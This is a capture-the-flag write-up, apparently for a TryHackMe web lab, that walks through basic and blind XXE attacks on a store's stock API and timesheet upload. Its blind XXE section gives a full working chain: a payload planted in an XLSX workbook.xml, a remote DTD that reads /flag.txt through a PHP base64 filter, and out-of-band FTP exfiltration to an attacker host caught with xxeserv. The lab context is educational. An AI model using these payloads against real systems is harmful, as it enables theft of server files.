## Basic XXE:
+ When testing XXE, we will test APIs which use XML.
+ We test the api `http://stock.nahamstore.thm` 
+ Using BurpSuite to cap the request of endpoints:

![](<Images/Pasted image 20250210164922.png>)

+ First we change the method `GET` become `POST` which means "create the product" to see what will happen.

![](<Images/Pasted image 20250210165312.png>)
	--> The message "Missing header X-Token" so we add more header `X-Token` with random value.

![](<Images/Pasted image 20250210165530.png>)
	
	--> That mean X-Token is not valid for the current product so we can fuzz to find the valid parameter is 
	suitable with X-Token.

+ We use the word list `SecLists/Discovery/Web-Content/api/objects.txt` to fuzzing the parameter:

![](<Images/Pasted image 20250210170402.png>)

--> We found the param `xml` which works.
+ We edit the request with XML format and add headers `Content-Type`  `Content-Length` 

![](<Images/Pasted image 20250210171232.png>)
--> We replace tag `<error></error>` with `<X-Token></X-Token>`

![](<Images/Pasted image 20250210171710.png>)

+ Now we can inject payload Entity to exploit XXE:

![](<Images/Pasted image 20250210172322.png>)
------------------------------------------------------------------

## Blind XXE:
+ Access /staff, we've found the page "Timesheet Upload" which used by staff members.
+ This page use to upload Timesheet only format xlsx
	-->We guess this is the vulnerability XXE.
+ Researching and we found the technique that use to exploit XXE in XLSX file:
`https://www.linkedin.com/pulse/exploiting-xxe-vulnerabilities-xlsx-files-guide-denys-spys-sqouf` or `https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#xxe-inside-xlsx-file`

+ We could use the sample.xlsx in https://github.com/BuffaloWill/oxml_xxe/tree/master/samples or create by self.
+ View the structure :
```bash
$ 7z l sample.xlsx
   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
1980-01-01 00:00:00 .....         1440          364  [Content_Types].xml
1980-01-01 00:00:00 .....          588          245  _rels/.rels
1980-01-01 00:00:00 .....          980          258  xl/_rels/workbook.xml.rels
1980-01-01 00:00:00 .....          653          379  xl/workbook.xml
1980-01-01 00:00:00 .....         7079         1684  xl/theme/theme1.xml
1980-01-01 00:00:00 .....          628          352  xl/worksheets/sheet2.xml
1980-01-01 00:00:00 .....          628          352  xl/worksheets/sheet3.xml
1980-01-01 00:00:00 .....          816          441  xl/worksheets/sheet1.xml
1980-01-01 00:00:00 .....          209          172  xl/sharedStrings.xml
1980-01-01 00:00:00 .....         1260          583  xl/styles.xml
1980-01-01 00:00:00 .....          849          416  docProps/app.xml
1980-01-01 00:00:00 .....          593          320  docProps/core.xml
------------------- ----- ------------ ------------  ------------------------
1980-01-01 00:00:00              15723         5566  12 files
```

+ Extract Excel file:
`7z x -oXXE sample.xlsx`  or `unzip sample.xlsx -d extracted_xlsx
+ Access inside:
```bash
$ cd XXE/
$ ls
'[Content_Types].xml'   docProps   _rels   xl
```

+ Add your blind XXE payload inside `xl/workbook.xml`:
```bash
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE cdl [<!ELEMENT cdl ANY ><!ENTITY % asd SYSTEM "http://x.x.x.x:8000/xxe.dtd">%asd;%c;]>
<cdl>&rrr;</cdl>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
```

+ Rebuild Excel file:
```
$ cd XXE/
$ 7z u ../sample.xlsx * or unzip -r sample.xlsx *
```
**Note**: If we extract by `7z` or `unzip` when we recompress the file to rebuild, we should use `7z u`  or  `zip -r` for `7z` and `unzip` because they will recompress it the same way and many Excel parsing libraries will fail to recognize it as a valid Excel file.

+ Create a remote DTD will save us the time to rebuild a document each time we want to retrieve a different file. Instead we build the document once and then change the DTD. And using FTP instead of HTTP allows to retrieve much larger files.
```bash
xxe.dtd
<!ENTITY % d SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">
<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://x.x.x.x:2121/%d;'>">
```
**Note**: The first testing, we use `<!ENTITY % d SYSTEM "file:///flag.txt">` but when we run xxeserv to retrieve in the log file, the log file is empty so we use "PHP Wrapper Inside XXE", change `file://`  to  `php://filter/convert.base64-encode/resource=` --> It worked.

+ Serve DTD and receive FTP payload using xxeserv:
```bash
~/xxeserv$ ./xxeserv -o files.log -p 2121 -w -wd public -wp 8000
20xx/0x/0x 16:29:44 [*] File doesn't exist, creating
20xx/0x/0x 16:29:44 [*] Storing session into the file: files.log
20xx/0x/0x 16:29:44 [*] Starting Web Server on 8000 [public]
[*] No certificate files found in directory. Generating new...
[*] UNO Listening...
[*] Certificate files generated
20xx/0x/0x 16:29:44 [*] GO XXE FTP Server - Port:  2121
20xx/0x/0x 16:29:53 [*] Connection Accepted from [10.10.61.194:38146]
20xx/0x/0x 16:29:55 [x] Connection Closed
20xx/0x/0x 16:29:55 [*] Closing FTP Connection
20xx/0x/0x 16:29:55 [*] Connection Accepted from [10.10.61.194:38148]
20xx/0x/0x 16:29:57 [x] Connection Closed
20xx/0x/0x 16:29:57 [*] Closing FTP Connection
```

```bash
~$ sudo python3 -m http.server
[sudo] password for zicco: 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...-
10.10.61.194 - - [xx/xxx/20xx 16:29:53] "GET /xxe.dtd HTTP/1.0" 200 -
```

+ Read the file log:
```bash
$ cat files.log 
USER:  anonymous
PASS:  anonymous
//e2Q2YjIyY2IzZTM3YmVmMzJkODAwMTA1YjExMTA3ZDhmfQo=
SIZE
MDTM
USER:  anonymous
PASS:  anonymous
SIZE
PASV
```

------------------------------------------------------------------
